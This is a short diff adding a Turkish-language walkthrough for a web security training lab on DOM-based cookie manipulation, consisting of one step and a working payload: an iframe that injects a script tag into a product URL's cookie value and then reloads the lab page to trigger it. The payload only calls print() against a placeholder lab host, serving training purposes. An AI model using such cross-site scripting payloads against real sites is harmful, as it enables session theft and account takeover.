@@ -1,0 +1,4 @@
+LAB: DOM-based cookie manipulation
+
+1 - Aşağıdaki payloadı depolayıp gönderiyoruz.
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
